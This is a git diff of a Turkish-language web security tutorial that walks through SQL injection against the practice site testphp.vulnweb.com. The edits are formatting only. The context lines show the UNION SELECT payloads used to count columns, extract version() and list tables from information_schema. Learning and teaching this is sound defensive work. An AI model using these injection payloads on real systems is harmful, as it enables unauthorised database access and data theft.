@@ -96,19 +96,19 @@
 * Bunun önüne geçmek için 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201' adresimizi 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11' olarak değiştiriyoruz. Burada amacımız aynı kolon sayısını bulmak. Bu yüzden sorgularımızı 11'e kadar arttırıyoruz. Ekranımız yine geliyor. **NOT: SQL INJECTION YOKSA HİÇ BİR ZAMAN KOLONLARI BULAMAZSIN. ÖNCE TESPİT SONRA ENJEKSİYON**
 
 
-* referans sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1) ve ana sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11) en altına iniyoruz ve bir farklılık görüyoruz.
+* Referans sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1) ve ana sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11) en altına iniyoruz ve bir farklılık görüyoruz.
 
-**Ana Sayfa:**
+***Ana Sayfa:***
     ![alt text](<WebSec101 0x01_ss/image-6.png>) 
 
-**Referans Sayfası:**
+***Referans Sayfası:***
     ![alt text](<WebSec101 0x01_ss/image-7.png>)
 
 * Ana sayfadaki en son kısımda **7 2 9** sayılarını görme sebebimiz aslında adresimizde kolon sayılarının o noktalarda eşleştiğini gösteriyor. Dolayısıyla 7 2 veya 9 olan kısımlarla biz etkileşime geçebiliyoruz:
 
 * 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' 7 yerine **'version()'** yazdık ve 7 yazan yerde artık versiyon bilgisini alıyoruz.
 
-    ARTIK VERİ ÇIKARTMAYA BAŞLADIK
+    ***ARTIK VERİ ÇIKARTMAYA BAŞLADIK:***
     ![alt text](<WebSec101 0x01_ss/image-8.png>)
 
 * Şimdi veri ekranımızı biraz daha temiz hale getirebiliriz. 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' adresimizde **'='** den sonra gelen yere **'-9999999'** yazarsak önceki kolonlardan kurtulmuş oluyoruz ve daha temiz bir görüntü elde ediyoruz:
@@ -121,7 +121,7 @@
     türkçesi gibi: 
     **FROM information_schema.tables WHERE table_schema = database()** = table_schema'nın veritabanına eşit olduğu yerden information_schema.tables'ı getir.
 
-YENİ ÇEKTİĞİMİZ VERİLER:
+***YENİ ÇEKTİĞİMİZ VERİLER:***
     ![alt text](<WebSec101 0x01_ss/image-10.png>)
 
 
